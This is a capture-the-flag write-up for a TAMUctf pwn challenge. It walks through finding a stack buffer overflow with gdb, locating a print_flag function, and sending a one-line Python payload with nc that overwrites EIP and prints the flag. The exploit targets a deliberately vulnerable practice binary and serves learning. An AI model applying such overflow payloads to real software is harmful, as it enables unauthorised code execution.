```
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

So for the second pwnable we have a binary that claims it repeats everything you tell it.
```
I just love repeating what other people say!
I bet I can repeat anything you tell me!
```
As a test I write in a pattern to see if it's vulnerable to a buffer overflow.  Lo and behold!
```
0x46254130 in ?? ()
gdb-peda$ pattern offset 0x46254130
1176846640 found at offset: 243
```

So we now have EIP overwrite after 243 bytes.  If we use `info functions` within gdb we see an interesting function that looks mighty suspicious:
```
0x0804854b  print_flag
```

As a quick test I wrote into a file which created a buffer which returns into that function:
```bash
root@kali:~/Desktop/tamuctf# python -c 'print "A"*243+"\x4b\x85\x04\x08"' > /tmp/var 
root@kali:~/Desktop/tamuctf# nc pwn.ctf.tamu.edu 4322 < /tmp/var 
I just love repeating what other people say! 
I bet I can repeat anything you tell me! 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAK� 
This function has been deprecated 
gigem{3ch035_0f_7h3_p4s7} 
```
Well that was actually easier than pwn1!  We got the second flag!
